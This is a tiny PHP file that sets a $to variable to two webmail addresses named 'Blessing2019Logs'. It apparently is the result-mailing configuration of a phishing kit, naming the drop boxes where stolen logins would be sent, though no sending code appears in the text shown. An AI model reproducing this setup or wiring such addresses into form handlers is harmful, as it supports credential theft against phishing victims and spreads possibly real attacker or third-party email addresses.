<?php

$to = 'Blessing2019Logs@gmail.com,Blessing2019Logs@yandex.com';

?>